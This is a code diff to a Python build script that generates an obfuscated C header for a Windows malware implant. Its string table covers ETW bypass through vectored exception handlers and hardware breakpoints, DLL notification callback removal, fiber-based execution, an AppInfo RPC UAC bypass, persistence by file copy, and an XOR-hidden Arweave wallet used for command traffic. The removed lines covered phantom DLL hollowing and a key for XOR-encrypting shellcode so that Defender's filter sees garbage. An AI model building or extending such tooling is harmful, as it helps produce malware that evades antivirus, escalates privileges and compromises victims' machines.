@@ -52,30 +52,13 @@ OBFUSCATED_STRINGS = {
     "XSTR_ARWEAVE_GRAPHQL":         "/graphql",
     "XSTR_HTTP_POST":               "POST",
     "XSTR_JSON_CONTENT_TYPE":       "Content-Type: application/json",
-    # Sacrificial DLL allowlist
-    "XSTR_STOMP_DLL_1":             "xpsservices.dll",
-    "XSTR_STOMP_DLL_2":             "mfreadwrite.dll",
-    "XSTR_STOMP_DLL_3":             "dbgcore.dll",
-    "XSTR_STOMP_DLL_4":             "mfsensorgroup.dll",
     # Evasion.c (patchless ETW via VEH + hardware breakpoints)
     "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
     "XSTR_RTL_REMOVE_VEH":          "RtlRemoveVectoredExceptionHandler",
     "XSTR_NT_CONTINUE":             "NtContinue",
     "XSTR_RTL_CAPTURE_CTX":         "RtlCaptureContext",
-    # Stomper.c (phantom DLL hollowing via NTFS transactions)
-    "XSTR_KTMW32_DLL":              "ktmw32.dll",
-    "XSTR_CREATE_TRANSACTION":      "CreateTransaction",
-    "XSTR_CREATE_FILE_TXA":         "CreateFileTransactedA",
-    "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
-    "XSTR_KERNEL32_DLL":            "kernel32.dll",
-    "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
-    "XSTR_GET_TEMP_PATH_A":         "GetTempPathA",
+    # Install.c (file copy to persistence path)
     "XSTR_COPY_FILE_A":             "CopyFileA",
-    "XSTR_FIND_FIRST_FILE_A":       "FindFirstFileA",
-    "XSTR_FIND_NEXT_FILE_A":        "FindNextFileA",
-    "XSTR_FIND_CLOSE":              "FindClose",
-    "XSTR_CREATE_FILE_A":           "CreateFileA",
-    "XSTR_DLL_WILDCARD":            "*.dll",
     # Crypt.c (decompression via ntdll)
     "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
     # Evasion.c (DLL notification callback removal)
@@ -87,8 +70,6 @@ OBFUSCATED_STRINGS = {
     "XSTR_CONVERT_THREAD_TO_FIBER": "ConvertThreadToFiber",
     "XSTR_CREATE_FIBER":            "CreateFiber",
     "XSTR_SWITCH_TO_FIBER":         "SwitchToFiber",
-    # GhostHollow.c
-    "XSTR_DELETE_FILE_A":           "DeleteFileA",
     # Uac.c (AppInfo RPC UAC bypass)
     "XSTR_NCALRPC":                 "ncalrpc",
     "XSTR_APPINFO_UUID":            "201ef99a-7fa0-444c-9399-19ba84f12a1a",
@@ -267,8 +248,6 @@ def generate_payload_h(wallet_address: str, output_path: str) -> str:
         wallet_xor_key = random.randint(1, 255)
     xored_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in wallet_bytes])
 
-    placement_xor = bytes(random.randint(0, 255) for _ in range(16))
-
     lines = []
     lines.append("#pragma once")
     lines.append("")
@@ -289,12 +268,6 @@ def generate_payload_h(wallet_address: str, output_path: str) -> str:
     lines.append(f"#define ARWEAVE_WALLET_XOR_KEY  0x{wallet_xor_key:02X}")
     lines.append(f"#define ARWEAVE_WALLET_LEN      {len(wallet_bytes)}")
     lines.append(format_initializer("INIT_ARWEAVE_WALLET", xored_wallet))
-    lines.append("")
-    lines.append("// ---- Per-build 16-byte write-encryption key ----")
-    lines.append("// Phantom.c / GhostHollow.c XOR shellcode before writing to the")
-    lines.append("// transacted / delete-on-close file (MpFilter sees garbage).")
-    lines.append(format_initializer("INIT_PLACEMENT_XOR_KEY", placement_xor))
-    lines.append("#define PLACEMENT_XOR_KEY_LEN 16")
     lines.append("")
     lines.append("// ---- 4-byte string obfuscation key (randomized per build) ----")
     for i, k in enumerate(xkeys):
